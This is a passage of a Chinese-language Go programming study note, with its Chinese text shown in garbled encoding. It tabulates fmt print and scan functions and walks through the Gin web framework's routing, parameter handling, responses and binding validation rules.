<td>ä»å­—ç¬¦ä¸²ä¸­è¯»å–æ•°æ®</td>
</tr>
<tr>
<td></td>
<td><code>Sscanf</code></td>
<td>ä»å­—ç¬¦ä¸²ä¸­æŒ‰æ ¼å¼è¯»å–</td>
</tr>
<tr>
<td></td>
<td><code>Sscanln</code></td>
<td>ä»å­—ç¬¦ä¸²ä¸­è¯»å–ä¸€è¡Œ</td>
</tr>
<tr>
<td>æ ¼å¼æ§åˆ¶</td>
<td><code>%v</code></td>
<td>é»˜è®¤æ ¼å¼ï¼ˆå¸¸ç”¨ï¼‰</td>
</tr>
<tr>
<td></td>
<td><code>%#v</code></td>
<td>Go è¯­æ³•æ ¼å¼è¾“å‡º</td>
</tr>
<tr>
<td></td>
<td><code>%T</code></td>
<td>è¾“å‡ºå€¼çš„ç±»å‹</td>
</tr>
<tr>
<td></td>
<td><code>%+v</code></td>
<td>è¾“å‡ºå­—æ®µåå’Œå€¼ï¼ˆç»“æ„ä½“ï¼‰</td>
</tr>
<tr>
<td></td>
<td><code>%q</code></td>
<td>å­—ç¬¦ä¸²åŠ å¼•å·è¾“å‡º</td>
</tr>
<tr>
<td></td>
<td><code>%t</code></td>
<td>å¸ƒå°”å€¼</td>
</tr>
<tr>
<td></td>
<td><code>%d</code> <code>%x</code> <code>%b</code></td>
<td>åè¿›åˆ¶ã€åå…­è¿›åˆ¶ã€äºŒè¿›åˆ¶æ•´æ•°</td>
</tr>
<tr>
<td></td>
<td><code>%f</code> <code>%e</code> <code>%g</code></td>
<td>æµ®ç‚¹æ•°æ ¼å¼</td>
</tr>
</tbody></table>
<h3 id="1-Fprint-ç±»å‹-é…åˆosåº“"><a href="#1-Fprint-ç±»å‹-é…åˆosåº“" class="headerlink" title="1.Fprint:ç±»å‹(é…åˆosåº“)"></a>1.Fprint:ç±»å‹(é…åˆosåº“)</h3><table>
<thead>
<tr>
<th>å‡½æ•°å</th>
<th>æ˜¯å¦æ ¼å¼åŒ–</th>
<th>æ˜¯å¦è‡ªåŠ¨æ¢è¡Œ</th>
<th>è¾“å‡ºç›®æ ‡ç±»å‹</th>
<th>å¸¸è§ç”¨é€”è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>Fprint</code></td>
<td>âŒ</td>
<td>âŒ</td>
<td><code>io.Writer</code> æ¥å£</td>
<td>æ™®é€šè¾“å‡ºå†…å®¹ï¼Œä¸æ¢è¡Œ</td>
</tr>
<tr>
<td><code>Fprintln</code></td>
<td>âŒ</td>
<td>âœ…</td>
<td><code>io.Writer</code> æ¥å£</td>
<td>è¾“å‡ºå†…å®¹è‡ªåŠ¨æ¢è¡Œ</td>
</tr>
<tr>
<td><code>Fprintf</code></td>
<td>âœ…</td>
<td>âŒ</td>
<td><code>io.Writer</code> æ¥å£</td>
<td>å¸¦æ ¼å¼åŒ–è¾“å‡º</td>
</tr>
</tbody></table>
<h3 id="2-scanç±»å‹"><a href="#2-scanç±»å‹" class="headerlink" title="2.scanç±»å‹:"></a>2.scanç±»å‹:</h3><table>
<thead>
<tr>
<th>å‡½æ•°å</th>
<th>è¾“å…¥æº</th>
<th>æ˜¯å¦æ ¼å¼åŒ–</th>
<th>æ˜¯å¦é‡ç©ºæ ¼ç»“æŸ</th>
<th>æ˜¯å¦æ”¯æŒæ¢è¡Œ</th>
<th>å¸¸è§ç”¨é€”è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>Scan</code></td>
<td>æ ‡å‡†è¾“å…¥</td>
<td>âŒ</td>
<td>âœ…</td>
<td>âœ…</td>
<td>é€ä¸ªè¯»å–ï¼Œç©ºæ ¼&#x2F;æ¢è¡Œåˆ†éš”</td>
</tr>
<tr>
<td><code>Scanf</code></td>
<td>æ ‡å‡†è¾“å…¥</td>
<td>âœ…</td>
<td>âœ…</td>
<td>âœ…</td>
<td>æŒ‡å®šæ ¼å¼è¯»å–ï¼Œå¦‚ <code>%d %s</code></td>
</tr>
<tr>
<td><code>Scanln</code></td>
<td>æ ‡å‡†è¾“å…¥</td>
<td>âŒ</td>
<td>âœ…</td>
<td>âŒ</td>
<td>è¯»å–ä¸€æ•´è¡Œï¼Œè¯»å–å®Œç«‹å³ç»“æŸ</td>
</tr>
<tr>
<td><code>Sscan</code></td>
<td>å­—ç¬¦ä¸²</td>
<td>âŒ</td>
<td>âœ…</td>
<td>âœ…</td>
<td>ä»å­—ç¬¦ä¸²ä¸­è¯»å–</td>
</tr>
<tr>
<td><code>Sscanf</code></td>
<td>å­—ç¬¦ä¸²</td>
<td>âœ…</td>
<td>âœ…</td>
<td>âœ…</td>
<td>æ ¼å¼åŒ–å­—ç¬¦ä¸²è¯»å–</td>
</tr>
<tr>
<td><code>Sscanln</code></td>
<td>å­—ç¬¦ä¸²</td>
<td>âŒ</td>
<td>âœ…</td>
<td>âŒ</td>
<td>ç±»ä¼¼ <code>Scanln</code>ï¼Œä½†è¾“å…¥æ˜¯å­—ç¬¦ä¸²</td>
</tr>
</tbody></table>
<h3 id="3-Sscanç±»å‹"><a href="#3-Sscanç±»å‹" class="headerlink" title="3.Sscanç±»å‹:"></a>3.Sscanç±»å‹:</h3><table>
<thead>
<tr>
<th>å‡½æ•°å</th>
<th>è¾“å…¥æº</th>
<th>æ˜¯å¦æ ¼å¼åŒ–</th>
<th>æ˜¯å¦è‡ªåŠ¨æ¢è¡Œç»“æŸ</th>
<th>è°ƒç”¨æ–¹å¼</th>
<th>åŠŸèƒ½è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>Sscan</code></td>
<td>å­—ç¬¦ä¸²</td>
<td>âŒ</td>
<td>âœ…ï¼ˆé‡ç©ºæ ¼æˆ–æ¢è¡Œï¼‰</td>
<td><code>fmt.Sscan(str, &amp;a, &amp;b)</code></td>
<td>ä»å­—ç¬¦ä¸²ä¸­æå–å¤šä¸ªå€¼ï¼Œç©ºæ ¼åˆ†éš”</td>
</tr>
<tr>
<td><code>Sscanf</code></td>
<td>å­—ç¬¦ä¸²</td>
<td>âœ…</td>
<td>âœ…ï¼ˆæŒ‰æ ¼å¼åŒ¹é…ï¼‰</td>
<td><code>fmt.Sscanf(str, &quot;age=%d&quot;, &amp;a)</code></td>
<td>âœ… æŒ‰æ ¼å¼æå–ï¼Œé€‚ç”¨äºç»“æ„åŒ–æ•°æ®è§£æ</td>
</tr>
<tr>
<td><code>Sscanln</code></td>
<td>å­—ç¬¦ä¸²</td>
<td>âŒ</td>
<td>âŒï¼ˆä¸€è¡Œå†…æœ‰æ•ˆï¼‰</td>
<td><code>fmt.Sscanln(str, &amp;a, &amp;b)</code></td>
<td>ç±»ä¼¼ <code>Sscan</code>ï¼Œä½†ä¸¥æ ¼ä¸€è¡Œï¼Œç»“å°¾ä¸èƒ½å¤šä½™</td>
</tr>
</tbody></table>
<h2 id="5-ginåº“çš„å®ç°-åç«¯å¾®æœåŠ¡"><a href="#5-ginåº“çš„å®ç°-åç«¯å¾®æœåŠ¡" class="headerlink" title="5.ginåº“çš„å®ç°(åç«¯å¾®æœåŠ¡):"></a>5.ginåº“çš„å®ç°(åç«¯å¾®æœåŠ¡):</h2><h3 id="1-åŸºç¡€å®ç°"><a href="#1-åŸºç¡€å®ç°" class="headerlink" title="1.åŸºç¡€å®ç°;"></a>1.åŸºç¡€å®ç°;</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 1.åˆ›å»ºè·¯ç”±</span></span><br><span class="line">   r := gin.Default()</span><br><span class="line">   <span class="comment">// 2.ç»‘å®šè·¯ç”±è§„åˆ™ï¼Œæ‰§è¡Œçš„å‡½æ•°</span></span><br><span class="line">   <span class="comment">// gin.Contextï¼Œå°è£…äº†requestå’Œresponse</span></span><br><span class="line">   r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">      c.String(http.StatusOK, <span class="string">&quot;hello World!&quot;</span>)</span><br><span class="line">   &#125;)</span><br><span class="line">   <span class="comment">// 3.ç›‘å¬ç«¯å£ï¼Œé»˜è®¤åœ¨8080</span></span><br><span class="line">   <span class="comment">// Run(&quot;é‡Œé¢ä¸æŒ‡å®šç«¯å£å·é»˜è®¤ä¸º8080&quot;) </span></span><br><span class="line">   r.Run(<span class="string">&quot;:8000&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-è·¯ç”±"><a href="#2-è·¯ç”±" class="headerlink" title="2.è·¯ç”±:"></a>2.è·¯ç”±:</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">è·¯ç”±æ˜¯ç”±r.Get(<span class="string">&quot;/&quot;</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>&#123;&#125;)     ---ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ï¼šè·¯å¾„ï¼› ç¬¬äºŒä¸ªå‚æ•°æ˜¯ï¼šå…·ä½“æ“ä½œ <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span></span><br></pre></td></tr></table></figure>

<h4 id="1-è·¯ç”±åˆ†ç»„-ï¼š"><a href="#1-è·¯ç”±åˆ†ç»„-ï¼š" class="headerlink" title="1.è·¯ç”±åˆ†ç»„ ï¼š"></a>1.è·¯ç”±åˆ†ç»„ ï¼š</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä¸¤ä¸ªè·¯ç”±ç»„ï¼Œéƒ½å¯ä»¥è®¿é—®ï¼Œå¤§æ‹¬å·æ˜¯ä¸ºäº†ä¿è¯è§„èŒƒ</span></span><br><span class="line">v1 := r.Group(<span class="string">&quot;/v1&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// é€šè¿‡ localhost:8080/v1/helloè®¿é—®ï¼Œä»¥æ­¤ç±»æ¨</span></span><br><span class="line">    v1.GET(<span class="string">&quot;/hello&quot;</span>, sayHello)</span><br><span class="line">    v1.GET(<span class="string">&quot;/world&quot;</span>, sayWorld)</span><br><span class="line">&#125;</span><br><span class="line">v2 := r.Group(<span class="string">&quot;/v2&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    v2.GET(<span class="string">&quot;/hello&quot;</span>, sayHello)</span><br><span class="line">    v2.GET(<span class="string">&quot;/world&quot;</span>, sayWorld)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="2-å¤§é‡è·¯ç”±å®ç°"><a href="#2-å¤§é‡è·¯ç”±å®ç°" class="headerlink" title="2.å¤§é‡è·¯ç”±å®ç°:"></a>2.å¤§é‡è·¯ç”±å®ç°:</h5><p>æŠŠ Gin çš„è·¯ç”±æ³¨å†Œé€»è¾‘ <strong>æŒ‰æ¨¡å—æ‹†åˆ†åˆ°å¤šä¸ª Go æ–‡ä»¶ä¸­ï¼ˆé€šå¸¸æ”¾åœ¨ <code>routers</code> åŒ…ä¸‹ï¼‰</strong>ï¼Œæ¯ä¸ªæ–‡ä»¶åªè´Ÿè´£æ³¨å†ŒæŸä¸€ç±»è·¯ç”±ï¼Œæ¯”å¦‚ç”¨æˆ·æ¨¡å—ã€æ–‡ç« æ¨¡å—ç­‰ï¼Œæœ€å <code>main.go</code> ç»Ÿä¸€è°ƒç”¨è¿™äº›æ³¨å†Œå‡½æ•°ï¼Œå®ç°æ•´ä½“è·¯ç”±æ³¨å†Œã€‚</p>
<table>
<thead>
<tr>
<th>æ–‡ä»¶&#x2F;ç›®å½•</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>main.go</code></td>
<td>ä¸»å‡½æ•°ï¼Œåˆ›å»º <code>engine</code> å¹¶è°ƒç”¨å¤šä¸ªæ³¨å†Œå‡½æ•°</td>
</tr>
<tr>
<td><code>routers/</code></td>
<td>è·¯ç”±æ¨¡å—ç›®å½•</td>
</tr>
<tr>
<td><code>routers/user.go</code></td>
<td>ç”¨æˆ·ç›¸å…³è·¯ç”±æ³¨å†Œæ–¹æ³•ï¼ˆå¦‚ <code>/user/login</code>ï¼‰</td>
</tr>
<tr>
<td><code>routers/article.go</code></td>
<td>æ–‡ç« ç›¸å…³è·¯ç”±æ³¨å†Œæ–¹æ³•ï¼ˆå¦‚ <code>/article/list</code>ï¼‰</td>
</tr>
</tbody></table>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">go_project/</span><br><span class="line">â”œâ”€â”€ main.<span class="keyword">go</span></span><br><span class="line">â””â”€â”€ routers/</span><br><span class="line">    â”œâ”€â”€ user.<span class="keyword">go</span></span><br><span class="line">    â””â”€â”€ article.<span class="keyword">go</span></span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">routers/user.<span class="keyword">go</span>çš„å®ç°</span><br><span class="line"><span class="keyword">package</span> routers</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RegisterUserRoutes</span><span class="params">(r *gin.Engine)</span></span> &#123;</span><br><span class="line">	userGroup := r.Group(<span class="string">&quot;/user&quot;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		userGroup.GET(<span class="string">&quot;/login&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">			c.String(http.StatusOK, <span class="string">&quot;ç”¨æˆ·ç™»å½•&quot;</span>)</span><br><span class="line">		&#125;)</span><br><span class="line">		userGroup.GET(<span class="string">&quot;/info&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">			c.String(http.StatusOK, <span class="string">&quot;ç”¨æˆ·ä¿¡æ¯&quot;</span>)</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">æœ€ååœ¨mainå‡½æ•°ä¸­:</span><br><span class="line">routers.RegisterUserRoutes(r)   ---å°±å¯ä»¥ç›´æ¥æ³¨å†Œè¿™ä¸ªè·¯ç”±åˆ†ç»„</span><br></pre></td></tr></table></figure>

<h3 id="3-è·å–å‚æ•°ï¼š"><a href="#3-è·å–å‚æ•°ï¼š" class="headerlink" title="3.è·å–å‚æ•°ï¼š"></a>3.è·å–å‚æ•°ï¼š</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">: åªèƒ½åŒ¹é…<span class="number">1</span>ä¸ªï¼Œ* å¯ä»¥åŒ¹é…ä»»æ„ä¸ªæ•°</span><br></pre></td></tr></table></figure>

<h4 id="1-è·¯å¾„å‚æ•°"><a href="#1-è·¯å¾„å‚æ•°" class="headerlink" title="1.è·¯å¾„å‚æ•°:"></a>1.è·¯å¾„å‚æ•°:</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">r.GET(<span class="string">&quot;/user/:name/*action&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    name := c.Param(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">    action := c.Param(<span class="string">&quot;action&quot;</span>)</span><br><span class="line">    <span class="comment">//æˆªå–/</span></span><br><span class="line">    action = strings.Trim(action, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    c.String(http.StatusOK, name+<span class="string">&quot; is &quot;</span>+action)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-URLå‚æ•°-get"><a href="#2-URLå‚æ•°-get" class="headerlink" title="2.URLå‚æ•°(get):"></a>2.URLå‚æ•°(get):</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">URLå‚æ•°å¯ä»¥é€šè¿‡DefaultQuery()æˆ–Query()æ–¹æ³•è·å–</span><br><span class="line">DefaultQuery()è‹¥å‚æ•°ä¸å­˜åœ¨åˆ™ï¼Œè¿”å›é»˜è®¤å€¼ï¼ŒQuery()è‹¥ä¸å­˜åœ¨ï¼Œè¿”å›ç©ºä¸²</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">&quot;/user&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    <span class="comment">//æŒ‡å®šé»˜è®¤å€¼</span></span><br><span class="line">    name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;normal&quot;</span>)</span><br><span class="line">    <span class="comment">//è·å–å…·ä½“å€¼</span></span><br><span class="line">    age := c.Query(<span class="string">&quot;age&quot;</span>)</span><br><span class="line">    c.String(http.StatusOK, fmt.Sprintf(<span class="string">&quot;hello %s, your age is %s&quot;</span>, name, age))</span><br><span class="line">&#125;)      ---å¦‚æœæ²¡æœ‰nameå‚æ•°åˆ™ä¼šnameçš„å€¼ä¸ºnormal</span><br></pre></td></tr></table></figure>

<h4 id="3-POSTå‚æ•°"><a href="#3-POSTå‚æ•°" class="headerlink" title="3.POSTå‚æ•°:"></a>3.POSTå‚æ•°:</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">ä¸getç±»ä¼¼,å¯ä»¥é€šè¿‡DefaultPostForm()æˆ–è€…PostForm()æ–¹æ³•è·å–</span><br></pre></td></tr></table></figure>

<h4 id="4-æ–‡ä»¶è·å–"><a href="#4-æ–‡ä»¶è·å–" class="headerlink" title="4.æ–‡ä»¶è·å–:"></a>4.æ–‡ä»¶è·å–:</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">å•æ–‡ä»¶è·å–:</span><br><span class="line">    r.MaxMultipartMemory = <span class="number">8</span> &lt;&lt; <span class="number">20</span>   -<span class="number">-8</span>mib  é™åˆ¶ä¸Šä¼ æœ€å¤§å°ºå¯¸</span><br><span class="line">    file, err := c.FormFile(<span class="string">&quot;file&quot;</span>)    ---å¾—åˆ°æ–‡ä»¶</span><br><span class="line">    c.SaveUploadedFile(file, <span class="string">&quot;C:/desktop/&quot;</span>+file.Filename)   ---ä¸Šä¼ åˆ°æŒ‡å®šè·¯å¾„</span><br><span class="line">å¤šæ–‡ä»¶è·å–:</span><br><span class="line">    form, err := c.MultipartForm()  ---è§£æåçš„å¤šéƒ¨åˆ†è¡¨å•æ•°æ®</span><br><span class="line">    files := form.File[<span class="string">&quot;files&quot;</span>]     ---å¾—åˆ°æ‰€æœ‰æ–‡ä»¶</span><br><span class="line">    <span class="keyword">for</span> _, file := <span class="keyword">range</span> files &#123;    ---_è¿™ä¸ªä½ç½®æ˜¯ç´¢å¼•</span><br><span class="line">        <span class="comment">// é€ä¸ªå­˜</span></span><br><span class="line">        fmt.Println(file.Filename)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="5-è·å–è¯·æ±‚å‚æ•°"><a href="#5-è·å–è¯·æ±‚å‚æ•°" class="headerlink" title="5.è·å–è¯·æ±‚å‚æ•°:"></a>5.è·å–è¯·æ±‚å‚æ•°:</h4><table>
<thead>
<tr>
<th>åŠŸèƒ½</th>
<th>ç¤ºä¾‹ç”¨æ³•</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>è·å–è¯·æ±‚æ–¹æ³•</td>
<td><code>c.Request.Method</code></td>
<td>â€œGETâ€, â€œPOSTâ€, etc.</td>
</tr>
<tr>
<td>è·å–å®Œæ•´ URL</td>
<td><code>c.Request.URL.String()</code></td>
<td>è¯·æ±‚çš„å®Œæ•´è·¯å¾„å’Œå‚æ•°</td>
</tr>
<tr>
<td>è·å– URL è·¯å¾„</td>
<td><code>c.Request.URL.Path</code></td>
<td>ä¾‹å¦‚ <code>/login</code></td>
</tr>
<tr>
<td>è·å–æŸ¥è¯¢å‚æ•°ï¼ˆåŸå§‹ï¼‰</td>
<td><code>c.Request.URL.Query().Get(&quot;name&quot;)</code></td>
<td>ç­‰ä»·äº <code>c.Query(&quot;name&quot;)</code></td>
</tr>
<tr>
<td>è·å–è¯·æ±‚å¤´</td>
<td><code>c.Request.Header.Get(&quot;User-Agent&quot;)</code></td>
<td>è·å–è¯·æ±‚å¤´å­—æ®µ</td>
</tr>
<tr>
<td>è·å–è¯·æ±‚ä½“ï¼ˆå¦‚ JSONï¼‰</td>
<td><code>c.Request.Body</code></td>
<td>éœ€æ‰‹åŠ¨è¯»å–å’Œè§£æ</td>
</tr>
<tr>
<td>åˆ¤æ–­æ˜¯å¦ä¸º multipart</td>
<td><code>c.Request.MultipartForm != nil</code></td>
<td>æ–‡ä»¶ä¸Šä¼ åœºæ™¯å¸¸è§</td>
</tr>
<tr>
<td>è·å–è¡¨å•å­—æ®µï¼ˆPOSTï¼‰</td>
<td><code>c.Request.FormValue(&quot;username&quot;)</code></td>
<td>POST è¡¨å•å­—æ®µ</td>
</tr>
<tr>
<td>è·å–å®¢æˆ·ç«¯ IP</td>
<td><code>c.Request.RemoteAddr</code></td>
<td>å¯èƒ½ä¸º IP:PORT æ ¼å¼</td>
</tr>
</tbody></table>
<h3 id="4-è¿”å›å€¼"><a href="#4-è¿”å›å€¼" class="headerlink" title="4.è¿”å›å€¼:"></a>4.è¿”å›å€¼:</h3><table>
<thead>
<tr>
<th>æ–¹æ³•å</th>
<th>ç”¨é€”</th>
<th>è¿”å›æ ¼å¼</th>
<th>å¸¸ç”¨åœºæ™¯</th>
<th>å‚æ•°è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>c.String()</code></td>
<td>è¿”å›å­—ç¬¦ä¸²</td>
<td><code>text/plain</code></td>
<td>æ™®é€šæ–‡æœ¬è¿”å›ã€è°ƒè¯•ä¿¡æ¯</td>
<td><code>(statusCode int, format string, values ...interface&#123;&#125;)</code></td>
</tr>
<tr>
<td><code>c.JSON()</code></td>
<td>è¿”å› JSON æ•°æ®</td>
<td><code>application/json</code></td>
<td>API æ¥å£ã€å‰åç«¯äº¤äº’</td>
<td><code>(statusCode int, obj interface&#123;&#125;)</code>ï¼Œé€šå¸¸é…åˆ <code>gin.H</code> ä½¿ç”¨</td>
</tr>
<tr>
<td><code>c.HTML()</code></td>
<td>è¿”å› HTML é¡µé¢</td>
<td><code>text/html</code></td>
<td>ç½‘é¡µæ¨¡æ¿æ¸²æŸ“</td>
<td><code>(statusCode int, name string, obj interface&#123;&#125;)</code>ï¼Œéœ€ä½¿ç”¨æ¨¡æ¿å¼•æ“</td>
</tr>
<tr>
<td><code>c.Data()</code></td>
<td>è¿”å›ä»»æ„æ•°æ®</td>
<td>ä»»æ„ MIME ç±»å‹</td>
<td>è¿”å›å›¾ç‰‡ã€éŸ³é¢‘ã€äºŒè¿›åˆ¶ç­‰</td>
<td><code>(statusCode int, contentType string, data []byte)</code></td>
</tr>
<tr>
<td><code>c.XML()</code></td>
<td>è¿”å› XML æ•°æ®</td>
<td><code>application/xml</code></td>
<td>XML æ¥å£ï¼ˆå°‘è§ï¼‰</td>
<td><code>(statusCode int, obj interface&#123;&#125;)</code></td>
</tr>
<tr>
<td><code>c.Redirect()</code></td>
<td>é‡å®šå‘</td>
<td>HTTP 3xx</td>
<td>é¡µé¢è·³è½¬</td>
<td><code>(statusCode int, location string)</code></td>
</tr>
<tr>
<td><code>c.File()</code></td>
<td>è¿”å›æœ¬åœ°æ–‡ä»¶</td>
<td>è‡ªåŠ¨è¯†åˆ«ç±»å‹</td>
<td>æ–‡ä»¶ä¸‹è½½</td>
<td><code>(filepath string)</code></td>
</tr>
<tr>
<td><code>c.AbortWithStatus()</code></td>
<td>ä¸­æ–­è¯·æ±‚ï¼Œä»…è¿”å›çŠ¶æ€ç </td>
<td>æ— æ­£æ–‡</td>
<td>æ‹¦æˆªéæ³•è¯·æ±‚</td>
<td><code>(statusCode int)</code></td>
</tr>
</tbody></table>
<h3 id="5-æ¨¡å‹ç»‘å®š"><a href="#5-æ¨¡å‹ç»‘å®š" class="headerlink" title="5.æ¨¡å‹ç»‘å®š:"></a>5.æ¨¡å‹ç»‘å®š:</h3><table>
<thead>
<tr>
<th>æ•°æ®æ¥æº</th>
<th>ä½¿ç”¨æ–¹æ³•</th>
<th>ç¤ºä¾‹è¯·æ±‚æ–¹å¼</th>
</tr>
</thead>
<tbody><tr>
<td><code>Query</code> å‚æ•°</td>
<td><code>ShouldBindQuery()</code></td>
<td><code>/search?name=Tom</code></td>
</tr>
<tr>
<td><code>Form</code> è¡¨å•</td>
<td><code>ShouldBind()</code></td>
<td>POST è¡¨å•ï¼ˆé»˜è®¤æ–¹å¼ï¼‰</td>
</tr>
<tr>
<td><code>JSON</code> è¯·æ±‚ä½“</td>
<td><code>ShouldBindJSON()</code></td>
<td><code>application/json</code></td>
</tr>
<tr>
<td><code>URI</code> è·¯å¾„å‚æ•°</td>
<td><code>ShouldBindUri()</code></td>
<td><code>/user/:id/:name</code></td>
</tr>
<tr>
<td>é€šç”¨è‡ªåŠ¨è¯†åˆ«</td>
<td><code>ShouldBind()</code></td>
<td>æ ¹æ® <code>Content-Type</code> è‡ªåŠ¨</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>æ ‡ç­¾å</th>
<th>æ¥æº</th>
</tr>
</thead>
<tbody><tr>
<td><code>form:&quot;&quot;</code></td>
<td>query&#x2F;form-data</td>
</tr>
<tr>
<td><code>json:&quot;&quot;</code></td>
<td>JSON è¯·æ±‚ä½“</td>
</tr>
<tr>
<td><code>uri:&quot;&quot;</code></td>
<td>URL è·¯å¾„å‚æ•°</td>
</tr>
<tr>
<td><code>binding:&quot;required&quot;</code></td>
<td>å¿…å¡«éªŒè¯</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>è§„åˆ™å</th>
<th>ä½œç”¨è¯´æ˜</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td><code>required</code></td>
<td>å¿…å¡«å­—æ®µ</td>
<td><code>binding:&quot;required&quot;</code></td>
</tr>
<tr>
<td><code>omitempty</code></td>
<td>è‹¥å­—æ®µä¸ºç©ºåˆ™è·³è¿‡åç»­æ ¡éªŒï¼ˆä¸å…¶ä»–é…åˆï¼‰</td>
<td><code>binding:&quot;omitempty,email&quot;</code></td>
</tr>
<tr>
<td><code>gt=X</code></td>
<td>å¤§äº Xï¼ˆæ•°å­—ï¼‰</td>
<td><code>binding:&quot;gt=0&quot;</code></td>
</tr>
<tr>
<td><code>lt=X</code></td>
<td>å°äº X</td>
<td><code>binding:&quot;lt=100&quot;</code></td>
</tr>
<tr>
<td><code>gte=X</code></td>
<td>å¤§äºç­‰äº X</td>
<td><code>binding:&quot;gte=1&quot;</code></td>
</tr>
<tr>
<td><code>lte=X</code></td>
<td>å°äºç­‰äº X</td>
<td><code>binding:&quot;lte=10&quot;</code></td>
</tr>
<tr>
<td><code>min=X</code></td>
<td>å­—ç¬¦ä¸²&#x2F;æ•°ç»„ æœ€å°é•¿åº¦</td>
<td><code>binding:&quot;min=6&quot;</code></td>
</tr>
<tr>
<td><code>max=X</code></td>
<td>å­—ç¬¦ä¸²&#x2F;æ•°ç»„ æœ€å¤§é•¿åº¦</td>
<td><code>binding:&quot;max=20&quot;</code></td>
</tr>
<tr>
<td><code>len=X</code></td>
<td>ç²¾ç¡®é•¿åº¦è¦æ±‚</td>
<td><code>binding:&quot;len=11&quot;</code></td>
</tr>
<tr>
<td><code>eq=X</code></td>
<td>å¿…é¡»ç­‰äº Xï¼ˆå¸¸ç”¨äºå›ºå®šå€¼ï¼‰</td>
<td><code>binding:&quot;eq=ç”·&quot;</code></td>
</tr>
<tr>
<td><code>ne=X</code></td>
<td>ä¸ç­‰äº X</td>
<td><code>binding:&quot;ne=æ— æ•ˆ&quot;</code></td>
</tr>
<tr>
<td><code>email</code></td>
<td>é‚®ç®±æ ¼å¼</td>
<td><code>binding:&quot;required,email&quot;</code></td>
</tr>
<tr>
<td><code>url</code></td>
<td>åˆæ³•çš„ URL</td>
<td><code>binding:&quot;url&quot;</code></td>
</tr>
<tr>
<td><code>uuid</code></td>
<td>åˆæ³• UUID æ ¼å¼</td>
<td><code>binding:&quot;uuid&quot;</code></td>
</tr>
<tr>
<td><code>oneof=val1 val2</code></td>
<td>é™å®šæšä¸¾å€¼</td>
<td><code>binding:&quot;oneof=ç”· å¥³&quot;</code></td>
</tr>
<tr>
<td><code>datetime=2006-01-02</code></td>
<td>è‡ªå®šä¹‰æ—¶é—´æ ¼å¼æ ¡éªŒ</td>
<td><code>binding:&quot;datetime=2006-01-02&quot;</code></td>
</tr>
<tr>
<td><code>numeric</code></td>
<td>å¿…é¡»ä¸ºæ•°å­—ï¼ˆå­—ç¬¦ä¸²å‹ï¼‰</td>
<td><code>binding:&quot;numeric&quot;</code></td>
</tr>
<tr>
<td><code>boolean</code></td>
<td>å¿…é¡»ä¸ºå¸ƒå°”å€¼ï¼ˆtrue&#x2F;falseï¼‰</td>
<td><code>binding:&quot;boolean&quot;</code></td>
</tr>
</tbody></table>
<h3 id="6-ä¸­é—´ä»¶"><a href="#6-ä¸­é—´ä»¶" class="headerlink" title="6.ä¸­é—´ä»¶:"></a>6.ä¸­é—´ä»¶:</h3><table>
<thead>
<tr>
<th>åˆ†ç±»</th>
<th>ç¤ºä¾‹ä¸å†™æ³•</th>
<th>è¯´æ˜ä¸ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td><strong>ä½¿ç”¨æ–¹å¼</strong></td>
